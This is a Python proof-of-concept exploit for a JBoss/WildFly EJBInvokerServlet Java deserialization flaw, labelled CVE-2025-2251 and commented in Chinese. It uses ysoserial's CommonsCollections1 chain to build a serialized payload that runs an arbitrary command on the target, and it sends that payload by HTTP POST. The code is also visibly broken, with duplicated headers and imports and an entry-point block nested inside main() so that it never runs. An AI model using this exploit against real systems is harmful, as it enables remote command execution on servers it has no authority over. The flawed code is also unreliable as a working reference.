##!/usr/bin/python
#-*- coding:utf-8 -*-
import requests
import sys

# !/usr/bin/env python3
# coding:utf-8
# !/usr/bin/env python3
# coding:utf-8
import requests
import argparse
import subprocess
import sys


def generate_malicious_payload(command):
    """
    使用 ysoserial 生成恶意序列化对象。
    假设使用 CommonsCollections1 链，需根据实际漏洞调整。
    """
    try:
        ysoserial_path = "D:\download_s\ysoserial-all.jar"  # 替换为实际 ysoserial.jar 路径
        cmd = f"java -jar {ysoserial_path} CommonsCollections1 '{command}'"
        result = subprocess.run(cmd, shell=True, capture_output=True)
        if result.returncode == 0:
            return result.stdout
        else:
            raise Exception(f"生成负载失败: {result.stderr.decode()}")
    except Exception as e:
        print(f"[-] 无法生成恶意负载: {str(e)}")
        sys.exit(1)


def poc(url, command):
    """
    测试 CVE-2025-2251 漏洞，通过向 EJBInvokerServlet 发送恶意序列化对象。
    """
    try:
        target = url + "/invoker/EJBInvokerServlet"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/octet-stream",
            "Accept": "application/octet-stream",
            "Connection": "close"
        }
        payload = generate_malicious_payload(command)

        response = requests.post(target, data=payload, headers=headers, verify=False, timeout=10)

        if response.status_code == 500:
            print(f"[+] [{url}] 可能存在 CVE-2025-2251 漏洞！")
            print(f"[+] 请检查服务器是否执行了命令 '{command}'")
            return True
        else:
            print(f"[-] [{url}] 未检测到 CVE-2025-2251 漏洞（状态码: {response.status_code}）")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] [{url}] 请求失败: {str(e)}")
        return False


def main():
    parser = argparse.ArgumentParser(description="PoC for CVE-2025-2251 (JBoss EJB Deserialization RCE)")
    parser.add_argument("--url", required=True, help="目标 JBoss 服务器 URL（例如 http://example.com）")
    parser.add_argument("--command", default="whoami", help="要执行的命令（默认: whoami）")
    args = parser.parse_args()

    print(f"[*] 测试 CVE-2025-2251 漏洞: {args.url}")
    print(f"[*] 执行命令: {args.command}")

    result = poc(args.url, args.command)
    if result:
        print(f"[*] 建议升级 WildFly/JBoss EAP 或应用相关补丁。")
        print(f"[*] 参考: https://access.redhat.com/security/cve/CVE-2025-2251")


    if __name__ == "__main__":

        url = "http://127.0.0.1:8080/"
        default_command = "whoami"
        poc(url, default_command)
